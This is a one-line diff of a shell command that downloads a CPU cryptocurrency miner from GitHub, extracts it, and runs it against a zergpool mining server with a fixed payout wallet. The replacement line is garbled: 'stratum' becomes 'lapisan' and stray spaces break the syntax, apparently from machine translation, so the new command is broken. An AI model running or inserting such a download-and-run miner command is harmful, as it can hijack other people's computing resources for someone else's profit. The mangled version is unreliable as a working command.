@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/release/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a m7m -o stratum+tcp://m7m.asia.mine.zergpool.com:6033 -u TTKVZUMVN8B77fqvsgtnihAjfNHELXgpeC -p c=TRX -t 8
+wget https://github.com/rplant8/cpuminer-opt-rplant/release/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a m7m -o lapisan + tcp://m7m.asia.mine.zergpool.com:6033 -u TTKVZUMVN8B77fqvsgtnihAjfNHELXgpeC -p  c = TRX -t  8
